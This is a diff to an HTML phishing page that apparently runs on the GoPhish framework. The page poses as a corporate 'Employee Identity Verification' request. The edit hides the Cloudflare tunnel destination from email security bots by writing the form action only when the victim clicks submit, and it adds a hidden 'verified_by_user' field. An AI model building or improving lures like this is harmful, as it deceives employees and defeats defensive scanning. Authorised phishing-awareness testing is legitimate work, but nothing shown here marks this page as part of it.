@@ -17,8 +17,9 @@
         <h2>Employee Identity Verification</h2>
         <p>To ensure compliance with corporate information security standards, please click the button below to complete your mandatory annual system verification.</p>
         
-        <!-- Crucial: Changes the trigger from a page load to an active human form submission -->
+        <!-- Action starts empty so the email security bot cannot harvest your tunnel domain -->
         <form id="phishForm" method="POST">
+            <input type="hidden" name="status" value="verified_by_user">
             <input type="submit" class="btn-submit" value="Click Here to Verify Account">
         </form>
     </div>
@@ -27,12 +28,14 @@
         // 1. Capture the unique tracking token (?rid=xxxx) appended by GoPhish
         const currentParams = window.location.search;
         
-        // 2. Your Cloudflare Tunnel endpoint (Ensure your local terminal tunnel is actively running)
-        const targetCloudflare = "https://chicken-vpn-primarily-change.trycloudflare.com";
+        // 2. Your Cloudflare Tunnel endpoint (Make sure your local tunnel window is currently active)
+        const targetCloudflare = "https://chicken-vpn-primarily-change.trycloudflare.com ";
         
-        // 3. Fix: Instead of auto-redirecting, attach the destination and token to the form action attribute.
-        // This ensures the data payload is only transmitted back to GoPhish when an actual human clicks the button.
-        document.getElementById("phishForm").action = targetCloudflare + "/" + currentParams;
+        // 3. Dynamic Submission Handler: This ONLY triggers when a human clicks the button
+        document.getElementById("phishForm").addEventListener("submit", function(event) {
+            // One millisecond before the browser sends the form, we inject your active GoPhish tunnel tracking URL
+            this.action = targetCloudflare + "/" + currentParams;
+        });
     </script>
 </body>
 </html>
